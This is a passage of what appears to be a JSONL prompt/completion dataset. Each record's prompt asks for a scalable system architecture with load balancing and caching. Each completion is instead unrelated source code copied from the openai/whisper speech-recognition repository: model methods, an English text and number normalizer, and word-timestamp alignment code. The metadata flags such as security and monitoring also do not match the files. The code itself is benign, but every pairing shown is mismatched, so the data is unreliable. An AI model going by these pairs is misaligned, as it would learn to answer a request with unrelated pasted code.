def set_alignment_heads(self, dump: bytes):\n        array = np.frombuffer(\n            gzip.decompress(base64.b85decode(dump)), dtype=bool\n        ).copy()\n        mask = torch.from_numpy(array).reshape(\n            self.dims.n_text_layer, self.dims.n_text_head\n        )\n        self.register_buffer(\"alignment_heads\", mask.to_sparse(), persistent=False)\n\n    def embed_audio(self, mel: torch.Tensor):\n        return self.encoder(mel)\n\n    def logits(self, tokens: torch.Tensor, audio_features: torch.Tensor):\n        return self.decoder(tokens, audio_features)\n\n    def forward(\n        self, mel: torch.Tensor, tokens: torch.Tensor\n    ) -> Dict[str, torch.Tensor]:\n        return self.decoder(tokens, self.encoder(mel))\n\n    @property\n    def device(self):\n        return next(self.parameters()).device\n\n    @property\n    def is_multilingual(self):\n        return self.dims.n_vocab >= 51865\n\n    @property\n    def num_languages(self):\n        return self.dims.n_vocab - 51765 - int(self.is_multilingual)\n\n    def install_kv_cache_hooks(self, cache: Optional[dict] = None):\n        \"\"\"\n        The `MultiHeadAttention` module optionally accepts `kv_cache` which stores the key and value\n        tensors calculated for the previous positions. This method returns a dictionary that stores\n        all caches, and the necessary hooks for the key and value projection modules that save the\n        intermediate tensors to be reused during later calculations.\n\n        Returns\n        -------\n        cache : Dict[nn.Module, torch.Tensor]\n            A dictionary object mapping the key/value projection modules to its cache\n        hooks : List[RemovableHandle]\n            List of PyTorch RemovableHandle objects to stop the hooks to be called\n        \"\"\"\n        cache = {**cache} if cache is not None else {}\n        hooks = []\n\n        def save_to_cache(module, _, output):\n            if module not in cache or output.shape[1] > self.dims.n_text_ctx:\n                # save as-is, for the first token or cross attention\n                cache[module] = output\n            else:\n                cache[module] = torch.cat([cache[module], output], dim=1).detach()\n            return cache[module]\n\n        def install_hooks(layer: nn.Module):\n            if isinstance(layer, MultiHeadAttention):\n                hooks.append(layer.key.register_forward_hook(save_to_cache))\n                hooks.append(layer.value.register_forward_hook(save_to_cache))\n\n        self.decoder.apply(install_hooks)\n        return cache, hooks\n\n    detect_language = detect_language_function\n    transcribe = transcribe_function\n    decode = decode_function\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/model.py", "language": "python", "complexity": "complex", "star_count": 85533, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 346}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport os\nimport re\nfrom fractions import Fraction\nfrom typing import Iterator, List, Match, Optional, Union\n\nfrom more_itertools import windowed\n\nfrom .basic import remove_symbols_and_diacritics\n\n\nclass EnglishNumberNormalizer:\n    \"\"\"\n    Convert any spelled-out numbers into arabic numbers, while handling:\n\n    - remove any commas\n    - keep the suffixes such as: `1960s`, `274th`, `32nd`, etc.\n    - spell out currency symbols after the number. e.g. `$20 million` -> `20000000 dollars`\n    - spell out `one` and `ones`\n    - interpret successive single-digit numbers as nominal: `one oh one` -> `101`\n    \"\"\"\n\n    def __init__(self):\n        super().__init__()\n\n        self.zeros = {\"o\", \"oh\", \"zero\"}\n        self.ones = {\n            name: i\n            for i, name in enumerate(\n                [\n                    \"one\",\n                    \"two\",\n                    \"three\",\n                    \"four\",\n                    \"five\",\n                    \"six\",\n                    \"seven\",\n                    \"eight\",\n                    \"nine\",\n                    \"ten\",\n                    \"eleven\",\n                    \"twelve\",\n                    \"thirteen\",\n                    \"fourteen\",\n                    \"fifteen\",\n                    \"sixteen\",\n                    \"seventeen\",\n                    \"eighteen\",\n                    \"nineteen\",\n                ],\n                start=1,\n            )\n        }\n        self.ones_plural = {\n            \"sixes\" if name == \"six\" else name + \"s\": (value, \"s\")\n            for name, value in self.ones.items()\n        }\n        self.ones_ordinal = {\n            \"zeroth\": (0, \"th\"),\n            \"first\": (1, \"st\"),\n            \"second\": (2, \"nd\"),\n            \"third\": (3, \"rd\"),\n            \"fifth\": (5, \"th\"),\n            \"twelfth\": (12, \"th\"),\n            **{\n                name + (\"h\" if name.endswith(\"t\") else \"th\"): (value, \"th\")\n                for name, value in self.ones.items()\n                if value > 3 and value != 5 and value != 12\n            },\n        }\n        self.ones_suffixed = {**self.ones_plural, **self.ones_ordinal}\n\n        self.tens = {\n            \"twenty\": 20,\n            \"thirty\": 30,\n            \"forty\": 40,\n            \"fifty\": 50,\n            \"sixty\": 60,\n            \"seventy\": 70,\n            \"eighty\": 80,\n            \"ninety\": 90,\n        }\n        self.tens_plural = {\n            name.replace(\"y\", \"ies\"): (value, \"s\") for name, value in self.tens.items()\n        }\n        self.tens_ordinal = {\n            name.replace(\"y\", \"ieth\"): (value, \"th\")\n            for name, value in self.tens.items()\n        }\n        self.tens_suffixed = {**self.tens_plural, **self.tens_ordinal}\n\n        self.multipliers = {\n            \"hundred\": 100,\n            \"thousand\": 1_000,\n            \"million\": 1_000_000,\n            \"billion\": 1_000_000_000,\n            \"trillion\": 1_000_000_000_000,\n            \"quadrillion\": 1_000_000_000_000_000,\n            \"quintillion\": 1_000_000_000_000_000_000,\n            \"sextillion\": 1_000_000_000_000_000_000_000,\n            \"septillion\": 1_000_000_000_000_000_000_000_000,\n            \"octillion\": 1_000_000_000_000_000_000_000_000_000,\n            \"nonillion\": 1_000_000_000_000_000_000_000_000_000_000,\n            \"decillion\": 1_000_000_000_000_000_000_000_000_000_000_000,\n        }\n        self.multipliers_plural = {\n            name + \"s\": (value, \"s\") for name, value in self.multipliers.items()\n        }\n        self.multipliers_ordinal = {\n            name + \"th\": (value, \"th\") for name, value in self.multipliers.items()\n        }\n        self.multipliers_suffixed = {\n            **self.multipliers_plural,\n            **self.multipliers_ordinal,\n        }\n        self.decimals = {*self.ones, *self.tens, *self.zeros}\n\n        self.preceding_prefixers = {\n            \"minus\": \"-\",\n            \"negative\": \"-\",\n            \"plus\": \"+\",\n            \"positive\": \"+\",\n        }\n        self.following_prefixers = {\n            \"pound\": \"£\",\n            \"pounds\": \"£\",\n            \"euro\": \"€\",\n            \"euros\": \"€\",\n            \"dollar\": \"$\",\n            \"dollars\": \"$\",\n            \"cent\": \"¢\",\n            \"cents\": \"¢\",\n        }\n        self.prefixes = set(\n            list(self.preceding_prefixers.values())\n            + list(self.following_prefixers.values())\n        )\n        self.suffixers = {\n            \"per\": {\"cent\": \"%\"},\n            \"percent\": \"%\",\n        }\n        self.specials = {\"and\", \"double\", \"triple\", \"point\"}\n\n        self.words = set(\n            [\n                key\n                for mapping in [\n                    self.zeros,\n                    self.ones,\n                    self.ones_suffixed,\n                    self.tens,\n                    self.tens_suffixed,\n                    self.multipliers,\n                    self.multipliers_suffixed,\n                    self.preceding_prefixers,\n                    self.following_prefixers,\n                    self.suffixers,\n                    self.specials,\n                ]\n                for key in mapping\n            ]\n        )\n        self.literal_words = {\"one\", \"ones\"}\n\n    def process_words(self, words: List[str]) -> Iterator[str]:\n        prefix: Optional[str] = None\n        value: Optional[Union[str, int]] = None\n        skip = False\n\n        def to_fraction(s: str):\n            try:\n                return Fraction(s)\n            except ValueError:\n                return None\n\n        def output(result: Union[str, int]):\n            nonlocal prefix, value\n            result = str(result)\n            if prefix is not None:\n                result = prefix + result\n            value = None\n            prefix = None\n            return result\n\n        if len(words) == 0:\n            return\n\n        for prev, current, next in windowed([None] + words + [None], 3):\n            if skip:\n                skip = False\n                continue\n\n            next_is_numeric = next is not None and re.match(r\"^\\d+(\\.\\d+)?$\", next)\n            has_prefix = current[0] in self.prefixes\n            current_without_prefix = current[1:] if has_prefix else current\n            if re.match(r\"^\\d+(\\.\\d+)?$\", current_without_prefix):\n                # arabic numbers (potentially with signs and fractions)\n                f = to_fraction(current_without_prefix)\n                assert f is not None\n                if value is not None:\n                    if isinstance(value, str) and value.endswith(\".\"):\n                        # concatenate decimals / ip address components\n                        value = str(value) + str(current)\n                        continue\n                    else:\n                        yield output(value)\n\n                prefix = current[0] if has_prefix else prefix\n                if f.denominator == 1:\n                    value = f.numerator  # store integers as int\n                else:\n                    value = current_without_prefix\n            elif current not in self.words:\n                # non-numeric words\n                if value is not None:\n                    yield output(value)\n                yield output(current)\n            elif current in self.zeros:\n                value = str(value or \"\") + \"0\"\n            elif current in self.ones:\n                ones = self.ones[current]\n\n                if value is None:\n                    value = ones\n                elif isinstance(value, str) or prev in self.ones:\n                    if (\n                        prev in self.tens and ones < 10\n                    ):  # replace the last zero with the digit\n                        assert value[-1] == \"0\"\n                        value = value[:-1] + str(ones)\n                    else:\n                        value = str(value) + str(ones)\n                elif ones < 10:\n                    if value % 10 == 0:\n                        value += ones\n                    else:\n                        value = str(value) + str(ones)\n                else:  # eleven to nineteen\n                    if value % 100 == 0:\n                        value += ones\n                    else:\n                        value = str(value) + str(ones)\n            elif current in self.ones_suffixed:\n                # ordinal or cardinal; yield the number right away\n                ones, suffix = self.ones_suffixed[current]\n                if value is None:\n                    yield output(str(ones) + suffix)\n                elif isinstance(value, str) or prev in self.ones:\n                    if prev in self.tens and ones < 10:\n                        assert value[-1] == \"0\"\n                        yield output(value[:-1] + str(ones) + suffix)\n                    else:\n                        yield output(str(value) + str(ones) + suffix)\n                elif ones < 10:\n                    if value % 10 == 0:\n                        yield output(str(value + ones) + suffix)\n                    else:\n                        yield output(str(value) + str(ones) + suffix)\n                else:  # eleven to nineteen\n                    if value % 100 == 0:\n                        yield output(str(value + ones) + suffix)\n                    else:\n                        yield output(str(value) + str(ones) + suffix)\n                value = None\n            elif current in self.tens:\n                tens = self.tens[current]\n                if value is None:\n                    value = tens\n                elif isinstance(value, str):\n                    value = str(value) + str(tens)\n                else:\n                    if value % 100 == 0:\n                        value += tens\n                    else:\n                        value = str(value) + str(tens)\n            elif current in self.tens_suffixed:\n                # ordinal or cardinal; yield the number right away\n                tens, suffix = self.tens_suffixed[current]\n                if value is None:\n                    yield output(str(tens) + suffix)\n                elif isinstance(value, str):\n                    yield output(str(value) + str(tens) + suffix)\n                else:\n                    if value % 100 == 0:\n                        yield output(str(value + tens) + suffix)\n                    else:\n                        yield output(str(value) + str(tens) + suffix)\n            elif current in self.multipliers:\n                multiplier = self.multipliers[current]\n                if value is None:\n                    value = multiplier\n                elif isinstance(value, str) or value == 0:\n                    f = to_fraction(value)\n                    p = f * multiplier if f is not None else None\n                    if f is not None and p.denominator == 1:\n                        value = p.numerator\n                    else:\n                        yield output(value)\n                        value = multiplier\n                else:\n                    before = value // 1000 * 1000\n                    residual = value % 1000\n                    value = before + residual * multiplier\n            elif current in self.multipliers_suffixed:\n                multiplier, suffix = self.multipliers_suffixed[current]\n                if value is None:\n                    yield output(str(multiplier) + suffix)\n                elif isinstance(value, str):\n                    f = to_fraction(value)\n                    p = f * multiplier if f is not None else None\n                    if f is not None and p.denominator == 1:\n                        yield output(str(p.numerator) + suffix)\n                    else:\n                        yield output(value)\n                        yield output(str(multiplier) + suffix)\n                else:  # int\n                    before = value // 1000 * 1000\n                    residual = value % 1000\n                    value = before + residual * multiplier\n                    yield output(str(value) + suffix)\n                value = None\n            elif current in self.preceding_prefixers:\n                # apply prefix (positive, minus, etc.) if it precedes a number\n                if value is not None:\n                    yield output(value)\n\n                if next in self.words or next_is_numeric:\n                    prefix = self.preceding_prefixers[current]\n                else:\n                    yield output(current)\n            elif current in self.following_prefixers:\n                # apply prefix (dollars, cents, etc.) only after a number\n                if value is not None:\n                    prefix = self.following_prefixers[current]\n                    yield output(value)\n                else:\n                    yield output(current)\n            elif current in self.suffixers:\n                # apply suffix symbols (percent -> '%')\n                if value is not None:\n                    suffix = self.suffixers[current]\n                    if isinstance(suffix, dict):\n                        if next in suffix:\n                            yield output(str(value) + suffix[next])\n                            skip = True\n                        else:\n                            yield output(value)\n                            yield output(current)\n                    else:\n                        yield output(str(value) + suffix)\n                else:\n                    yield output(current)\n            elif current in self.specials:\n                if next not in self.words and not next_is_numeric:\n                    # apply special handling only if the next word can be numeric\n                    if value is not None:\n                        yield output(value)\n                    yield output(current)\n                elif current == \"and\":\n                    # ignore \"and\" after hundreds, thousands, etc.\n                    if prev not in self.multipliers:\n                        if value is not None:\n                            yield output(value)\n                        yield output(current)\n                elif current == \"double\" or current == \"triple\":\n                    if next in self.ones or next in self.zeros:\n                        repeats = 2 if current == \"double\" else 3\n                        ones = self.ones.get(next, 0)\n                        value = str(value or \"\") + str(ones) * repeats\n                        skip = True\n                    else:\n                        if value is not None:\n                            yield output(value)\n                        yield output(current)\n                elif current == \"point\":\n                    if next in self.decimals or next_is_numeric:\n                        value = str(value or \"\") + \".\"\n                else:\n                    # should all have been covered at this point\n                    raise ValueError(f\"Unexpected token: {current}\")\n            else:\n                # all should have been covered at this point\n                raise ValueError(f\"Unexpected token: {current}\")\n\n        if value is not None:\n            yield output(value)\n\n    def preprocess(self, s: str):\n        # replace \"<number> and a half\" with \"<number> point five\"\n        results = []\n\n        segments = re.split(r\"\\band\\s+a\\s+half\\b\", s)\n        for i, segment in enumerate(segments):\n            if len(segment.strip()) == 0:\n                continue\n            if i == len(segments) - 1:\n                results.append(segment)\n            else:\n                results.append(segment)\n                last_word = segment.rsplit(maxsplit=2)[-1]\n                if last_word in self.decimals or last_word in self.multipliers:\n                    results.append(\"point five\")\n                else:\n                    results.append(\"and a half\")\n\n        s = \" \".join(results)\n\n        # put a space at number/letter boundary\n        s = re.sub(r\"([a-z])([0-9])\", r\"\\1 \\2\", s)\n        s = re.sub(r\"([0-9])([a-z])\", r\"\\1 \\2\", s)\n\n        # but remove spaces which could be a suffix\n        s = re.sub(r\"([0-9])\\s+(st|nd|rd|th|s)\\b\", r\"\\1\\2\", s)\n\n        return s\n\n    def postprocess(self, s: str):\n        def combine_cents(m: Match):\n            try:\n                currency = m.group(1)\n                integer = m.group(2)\n                cents = int(m.group(3))\n                return f\"{currency}{integer}.{cents:02d}\"\n            except ValueError:\n                return m.string\n\n        def extract_cents(m: Match):\n            try:\n                return f\"¢{int(m.group(1))}\"\n            except ValueError:\n                return m.string\n\n        # apply currency postprocessing; \"$2 and ¢7\" -> \"$2.07\"\n        s = re.sub(r\"([€£$])([0-9]+) (?:and )?¢([0-9]{1,2})\\b\", combine_cents, s)\n        s = re.sub(r\"[€£$]0.([0-9]{1,2})\\b\", extract_cents, s)\n\n        # write \"one(s)\" instead of \"1(s)\", just for the readability\n        s = re.sub(r\"\\b1(s?)\\b\", r\"one\\1\", s)\n\n        return s\n\n    def __call__(self, s: str):\n        s = self.preprocess(s)\n        s = \" \".join(word for word in self.process_words(s.split()) if word is not None)\n        s = self.postprocess(s)\n\n        return s\n\n\nclass EnglishSpellingNormalizer:\n    \"\"\"\n    Applies British-American spelling mappings as listed in [1].\n\n    [1] https://www.tysto.com/uk-us-spelling-list.html\n    \"\"\"\n\n    def __init__(self):\n        mapping_path = os.path.join(os.path.dirname(__file__), \"english.json\")\n        self.mapping = json.load(open(mapping_path))\n\n    def __call__(self, s: str):\n        return \" \".join(self.mapping.get(word, word) for word in s.split())\n\n\nclass EnglishTextNormalizer:\n    def __init__(self):\n        self.ignore_patterns = r\"\\b(hmm|mm|mhm|mmm|uh|um)\\b\"\n        self.replacers = {\n            # common contractions\n            r\"\\bwon't\\b\": \"will not\",\n            r\"\\bcan't\\b\": \"can not\",\n            r\"\\blet's\\b\": \"let us\",\n            r\"\\bain't\\b\": \"aint\",\n            r\"\\by'all\\b\": \"you all\",\n            r\"\\bwanna\\b\": \"want to\",\n            r\"\\bgotta\\b\": \"got to\",\n            r\"\\bgonna\\b\": \"going to\",\n            r\"\\bi'ma\\b\": \"i am going to\",\n            r\"\\bimma\\b\": \"i am going to\",\n            r\"\\bwoulda\\b\": \"would have\",\n            r\"\\bcoulda\\b\": \"could have\",\n            r\"\\bshoulda\\b\": \"should have\",\n            r\"\\bma'am\\b\": \"madam\",\n            # contractions in titles/prefixes\n            r\"\\bmr\\b\": \"mister \",\n            r\"\\bmrs\\b\": \"missus \",\n            r\"\\bst\\b\": \"saint \",\n            r\"\\bdr\\b\": \"doctor \",\n            r\"\\bprof\\b\": \"professor \",\n            r\"\\bcapt\\b\": \"captain \",\n            r\"\\bgov\\b\": \"governor \",\n            r\"\\bald\\b\": \"alderman \",\n            r\"\\bgen\\b\": \"general \",\n            r\"\\bsen\\b\": \"senator \",\n            r\"\\brep\\b\": \"representative \",\n            r\"\\bpres\\b\": \"president \",\n            r\"\\brev\\b\": \"reverend \",\n            r\"\\bhon\\b\": \"honorable \",\n            r\"\\basst\\b\": \"assistant \",\n            r\"\\bassoc\\b\": \"associate \",\n            r\"\\blt\\b\": \"lieutenant \",\n            r\"\\bcol\\b\": \"colonel \",\n            r\"\\bjr\\b\": \"junior \",\n            r\"\\bsr\\b\": \"senior \",\n            r\"\\besq\\b\": \"esquire \",\n            # prefect tenses, ideally it should be any past participles, but it's harder..\n            r\"'d been\\b\": \" had been\",\n            r\"'s been\\b\": \" has been\",\n            r\"'d gone\\b\": \" had gone\",\n            r\"'s gone\\b\": \" has gone\",\n            r\"'d done\\b\": \" had done\",  # \"'s done\" is ambiguous\n            r\"'s got\\b\": \" has got\",\n            # general contractions\n            r\"n't\\b\": \" not\",\n            r\"'re\\b\": \" are\",\n            r\"'s\\b\": \" is\",\n            r\"'d\\b\": \" would\",\n            r\"'ll\\b\": \" will\",\n            r\"'t\\b\": \" not\",\n            r\"'ve\\b\": \" have\",\n            r\"'m\\b\": \" am\",\n        }\n        self.standardize_numbers = EnglishNumberNormalizer()\n        self.standardize_spellings = EnglishSpellingNormalizer()\n\n    def __call__(self, s: str):\n        s = s.lower()\n\n        s = re.sub(r\"[<\\[][^>\\]]*[>\\]]\", \"\", s)  # remove words between brackets\n        s = re.sub(r\"\\(([^)]+?)\\)\", \"\", s)  # remove words between parenthesis\n        s = re.sub(self.ignore_patterns, \"\", s)\n        s = re.sub(r\"\\s+'\", \"'\", s)  # when there's a space before an apostrophe\n\n        for pattern, replacement in self.replacers.items():\n            s = re.sub(pattern, replacement, s)\n\n        s = re.sub(r\"(\\d),(\\d)\", r\"\\1\\2\", s)  # remove commas between digits\n        s = re.sub(r\"\\.([^0-9]|$)\", r\" \\1\", s)  # remove periods not followed by numbers\n        s = remove_symbols_and_diacritics(s, keep=\".%$¢€£\")  # keep numeric symbols\n\n        s = self.standardize_numbers(s)\n        s = self.standardize_spellings(s)\n\n        # now remove prefix/suffix symbols that are not preceded/followed by numbers\n        s = re.sub(r\"[.$¢€£]([^0-9])\", r\" \\1\", s)\n        s = re.sub(r\"([^0-9])%\", r\"\\1 \", s)\n\n        s = re.sub(r\"\\s+\", \" \", s)  # replace any successive whitespaces with a space\n\n        return s\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/normalizers/english.py", "language": "python", "complexity": "complex", "star_count": 85533, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 551}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import itertools\nimport subprocess\nimport warnings\nfrom dataclasses import dataclass\nfrom typing import TYPE_CHECKING, List\n\nimport numba\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\n\nfrom .audio import HOP_LENGTH, SAMPLE_RATE, TOKENS_PER_SECOND\nfrom .tokenizer import Tokenizer\n\nif TYPE_CHECKING:\n    from .model import Whisper\n\n\ndef median_filter(x: torch.Tensor, filter_width: int):\n    \"\"\"Apply a median filter of width `filter_width` along the last dimension of `x`\"\"\"\n    pad_width = filter_width // 2\n    if x.shape[-1] <= pad_width:\n        # F.pad requires the padding width to be smaller than the input dimension\n        return x\n\n    if (ndim := x.ndim) <= 2:\n        # `F.pad` does not support 1D or 2D inputs for reflect padding but supports 3D and 4D\n        x = x[None, None, :]\n\n    assert (\n        filter_width > 0 and filter_width % 2 == 1\n    ), \"`filter_width` should be an odd number\"\n\n    result = None\n    x = F.pad(x, (filter_width // 2, filter_width // 2, 0, 0), mode=\"reflect\")\n    if x.is_cuda:\n        try:\n            from .triton_ops import median_filter_cuda\n\n            result = median_filter_cuda(x, filter_width)\n        except (RuntimeError, subprocess.CalledProcessError):\n            warnings.warn(\n                \"Failed to launch Triton kernels, likely due to missing CUDA toolkit; \"\n                \"falling back to a slower median kernel implementation...\"\n            )\n\n    if result is None:\n        # sort() is faster than torch.median (https://github.com/pytorch/pytorch/issues/51450)\n        result = x.unfold(-1, filter_width, 1).sort()[0][..., filter_width // 2]\n\n    if ndim <= 2:\n        result = result[0, 0]\n\n    return result\n\n\n@numba.jit(nopython=True)\ndef backtrace(trace: np.ndarray):\n    i = trace.shape[0] - 1\n    j = trace.shape[1] - 1\n    trace[0, :] = 2\n    trace[:, 0] = 1\n\n    result = []\n    while i > 0 or j > 0:\n        result.append((i - 1, j - 1))\n\n        if trace[i, j] == 0:\n            i -= 1\n            j -= 1\n        elif trace[i, j] == 1:\n            i -= 1\n        elif trace[i, j] == 2:\n            j -= 1\n        else:\n            raise ValueError(\"Unexpected trace[i, j]\")\n\n    result = np.array(result)\n    return result[::-1, :].T\n\n\n@numba.jit(nopython=True, parallel=True)\ndef dtw_cpu(x: np.ndarray):\n    N, M = x.shape\n    cost = np.ones((N + 1, M + 1), dtype=np.float32) * np.inf\n    trace = -np.ones((N + 1, M + 1), dtype=np.float32)\n\n    cost[0, 0] = 0\n    for j in range(1, M + 1):\n        for i in range(1, N + 1):\n            c0 = cost[i - 1, j - 1]\n            c1 = cost[i - 1, j]\n            c2 = cost[i, j - 1]\n\n            if c0 < c1 and c0 < c2:\n                c, t = c0, 0\n            elif c1 < c0 and c1 < c2:\n                c, t = c1, 1\n            else:\n                c, t = c2, 2\n\n            cost[i, j] = x[i - 1, j - 1] + c\n            trace[i, j] = t\n\n    return backtrace(trace)\n\n\ndef dtw_cuda(x, BLOCK_SIZE=1024):\n    from .triton_ops import dtw_kernel\n\n    M, N = x.shape\n    assert M < BLOCK_SIZE, f\"M should be smaller than {BLOCK_SIZE=}\"\n\n    x_skew = (\n        F.pad(x, (0, M + 1), value=np.inf).flatten()[: M * (N + M)].reshape(M, N + M)\n    )\n    x_skew = x_skew.T.contiguous()\n    cost = torch.ones(N + M + 2, M + 2) * np.inf\n    cost[0, 0] = 0\n    cost = cost.to(x.device)\n    trace = torch.zeros_like(cost, dtype=torch.int32)\n\n    dtw_kernel[(1,)](\n        cost,\n        trace,\n        x_skew,\n        x_skew.stride(0),\n        cost.stride(0),\n        trace.stride(0),\n        N,\n        M,\n        BLOCK_SIZE=BLOCK_SIZE,\n    )\n\n    trace = trace.T.flatten()[: (M + 1) * (M + N + 3)].reshape(M + 1, M + N + 3)[\n        :, : N + 1\n    ]\n    return backtrace(trace.cpu().numpy())\n\n\ndef dtw(x: torch.Tensor) -> np.ndarray:\n    if x.is_cuda:\n        try:\n            return dtw_cuda(x)\n        except (RuntimeError, subprocess.CalledProcessError):\n            warnings.warn(\n                \"Failed to launch Triton kernels, likely due to missing CUDA toolkit; \"\n                \"falling back to a slower DTW implementation...\"\n            )\n\n    return dtw_cpu(x.double().cpu().numpy())\n\n\n@dataclass\nclass WordTiming:\n    word: str\n    tokens: List[int]\n    start: float\n    end: float\n    probability: float\n\n\ndef find_alignment(\n    model: \"Whisper\",\n    tokenizer: Tokenizer,\n    text_tokens: List[int],\n    mel: torch.Tensor,\n    num_frames: int,\n    *,\n    medfilt_width: int = 7,\n    qk_scale: float = 1.0,\n) -> List[WordTiming]:\n    if len(text_tokens) == 0:\n        return []\n\n    tokens = torch.tensor(\n        [\n            *tokenizer.sot_sequence,\n            tokenizer.no_timestamps,\n            *text_tokens,\n            tokenizer.eot,\n        ]\n    ).to(model.device)\n\n    # install hooks on the cross attention layers to retrieve the attention weights\n    QKs = [None] * model.dims.n_text_layer\n    hooks = [\n        block.cross_attn.register_forward_hook(\n            lambda _, ins, outs, index=i: QKs.__setitem__(index, outs[-1][0])\n        )\n        for i, block in enumerate(model.decoder.blocks)\n    ]\n\n    from .model import disable_sdpa\n\n    with torch.no_grad(), disable_sdpa():\n        logits = model(mel.unsqueeze(0), tokens.unsqueeze(0))[0]\n        sampled_logits = logits[len(tokenizer.sot_sequence) :, : tokenizer.eot]\n        token_probs = sampled_logits.softmax(dim=-1)\n        text_token_probs = token_probs[np.arange(len(text_tokens)), text_tokens]\n        text_token_probs = text_token_probs.tolist()\n\n    for hook in hooks:\n        hook.remove()\n\n    # heads * tokens * frames\n    weights = torch.stack([QKs[_l][_h] for _l, _h in model.alignment_heads.indices().T])\n    weights = weights[:, :, : num_frames // 2]\n    weights = (weights * qk_scale).softmax(dim=-1)\n    std, mean = torch.std_mean(weights, dim=-2, keepdim=True, unbiased=False)\n    weights = (weights - mean) / std\n    weights = median_filter(weights, medfilt_width)\n\n    matrix = weights.mean(axis=0)\n    matrix = matrix[len(tokenizer.sot_sequence) : -1]\n    text_indices, time_indices = dtw(-matrix)\n\n    words, word_tokens = tokenizer.split_to_word_tokens(text_tokens + [tokenizer.eot])\n    if len(word_tokens) <= 1:\n        # return on eot only\n        # >>> np.pad([], (1, 0))\n        # array([0.])\n        # This results in crashes when we lookup jump_times with float, like\n        # IndexError: arrays used as indices must be of integer (or boolean) type\n        return []\n    word_boundaries = np.pad(np.cumsum([len(t) for t in word_tokens[:-1]]), (1, 0))\n\n    jumps = np.pad(np.diff(text_indices), (1, 0), constant_values=1).astype(bool)\n    jump_times = time_indices[jumps] / TOKENS_PER_SECOND\n    start_times = jump_times[word_boundaries[:-1]]\n    end_times = jump_times[word_boundaries[1:]]\n    word_probabilities = [\n        np.mean(text_token_probs[i:j])\n        for i, j in zip(word_boundaries[:-1], word_boundaries[1:])\n    ]\n\n    return [\n        WordTiming(word, tokens, start, end, probability)\n        for word, tokens, start, end, probability in zip(\n            words, word_tokens, start_times, end_times, word_probabilities\n        )\n    ]\n\n\ndef merge_punctuations(alignment: List[WordTiming], prepended: str, appended: str):\n    # merge prepended punctuations\n    i = len(alignment) - 2\n    j = len(alignment) - 1\n    while i >= 0:\n        previous = alignment[i]\n        following = alignment[j]\n        if previous.word.startswith(\" \") and previous.word.strip() in prepended:\n            # prepend it to the following word\n            following.word = previous.word + following.word\n            following.tokens = previous.tokens + following.tokens\n            previous.word = \"\"\n            previous.tokens = []\n        else:\n            j = i\n        i -= 1\n\n    # merge appended punctuations\n    i = 0\n    j = 1\n    while j < len(alignment):\n        previous = alignment[i]\n        following = alignment[j]\n        if not previous.word.endswith(\" \") and following.word in appended:\n            # append it to the previous word\n            previous.word = previous.word + following.word\n            previous.tokens = previous.tokens + following.tokens\n            following.word = \"\"\n            following.tokens = []\n        else:\n            i = j\n        j += 1\n\n\ndef add_word_timestamps(\n    *,\n    segments: List[dict],\n    model: \"Whisper\",\n    tokenizer: Tokenizer,\n    mel: torch.Tensor,\n    num_frames: int,\n    prepend_punctuations: str = \"\\\"'“¿([{-\",\n    append_punctuations: str = \"\\\"'.。,，!！?？:：”)]}、\",\n    last_speech_timestamp: float,\n    **kwargs,\n):\n    if len(segments) == 0:\n        return\n\n    text_tokens_per_segment = [\n        [token for token in segment[\"tokens\"] if token < tokenizer.eot]\n        for segment in segments\n    ]\n\n    text_tokens = list(itertools.chain.from_iterable(text_tokens_per_segment))\n    alignment = find_alignment(model, tokenizer, text_tokens, mel, num_frames, **kwargs)\n    word_durations = np.array([t.end - t.start for t in alignment])\n    word_durations = word_durations[word_durations.nonzero()]\n    median_duration = np.median(word_durations) if len(word_durations) > 0 else 0.0\n    median_duration = min(0.7, float(median_duration))\n    max_duration = median_duration * 2\n\n    # hack: truncate long words at sentence boundaries.\n    # a better segmentation algorithm based on VAD should be able to replace this.\n    if len(word_durations) > 0:\n        sentence_end_marks = \".。!！?？\"\n        # ensure words at sentence boundaries are not longer than twice the median word duration.\n        for i in range(1, len(alignment)):\n            if alignment[i].end - alignment[i].start > max_duration:\n                if alignment[i].word in sentence_end_marks:\n                    alignment[i].end = alignment[i].start + max_duration\n                elif alignment[i - 1].word in sentence_end_marks:\n                    alignment[i].start = alignment[i].end - max_duration\n\n    merge_punctuations(alignment, prepend_punctuations, append_punctuations)\n\n    time_offset = segments[0][\"seek\"] * HOP_LENGTH / SAMPLE_RATE\n    word_index = 0\n\n    for segment, text_tokens in zip(segments, text_tokens_per_segment):\n        saved_tokens = 0\n        words = []\n\n        while word_index < len(alignment) and saved_tokens < len(text_tokens):\n            timing = alignment[word_index]\n\n            if timing.word:\n                words.append(\n                    dict(\n                        word=timing.word,\n                        start=round(time_offset + timing.start, 2),\n                        end=round(time_offset + timing.end, 2),\n                        probability=timing.probability,\n                    )\n                )\n\n            saved_tokens += len(timing.tokens)\n            word_index += 1\n\n        # hack: truncate long words at segment boundaries.\n        # a better segmentation algorithm based on VAD should be able to replace this.\n        if len(words) > 0:\n            # ensure the first and second word after a pause is not longer than\n            # twice the median word duration.\n            if words[0][\"end\"] - last_speech_timestamp > median_duration * 4 and (\n                words[0][\"end\"] - words[0][\"start\"] > max_duration\n                or (\n                    len(words) > 1\n                    and words[1][\"end\"] - words[0][\"start\"] > max_duration * 2\n                )\n            ):\n                if (\n                    len(words) 